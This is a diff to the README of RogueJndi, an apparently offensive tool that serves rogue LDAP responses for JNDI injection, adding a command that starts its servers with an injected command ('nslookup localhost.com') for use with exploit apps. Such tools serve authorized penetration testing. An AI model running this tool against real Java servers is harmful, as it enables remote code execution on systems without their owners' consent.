@@ -64,6 +64,12 @@ Mapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere
 Mapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
 ```
 
+More specifically, you can use this command to start the servers, and use them with the exploit apps.
+
+```
+java -jar target/RogueJndi-1.1.jar --command "nslookup localhost.com" --hostname "192.168.1.10"
+```
+
 ### Building
 Java v1.7+ and Maven v3+ required
 ```
